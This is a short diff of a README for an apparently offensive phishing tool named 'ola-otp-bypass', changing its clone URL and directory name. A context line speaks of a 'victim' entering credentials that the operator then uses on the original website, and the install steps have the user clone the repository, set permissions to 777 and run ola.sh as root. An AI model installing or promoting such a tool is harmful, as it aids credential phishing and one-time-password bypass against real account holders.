@@ -16,8 +16,8 @@ When victim enter his credentials, you need to go to original website and use th
 
 # How to Intsall & Use
 root ---must !
-1. git clone https://github.com/Ignitetch/ola-otp-bypass.git
-2. cd ola-otp bypass/
+1. git clone https://github.com/Ignitetch/ola-otpbypass.git 
+2. cd ola-otpbypass/
 3. chmod 777 *
 4. ./ola.sh 
 
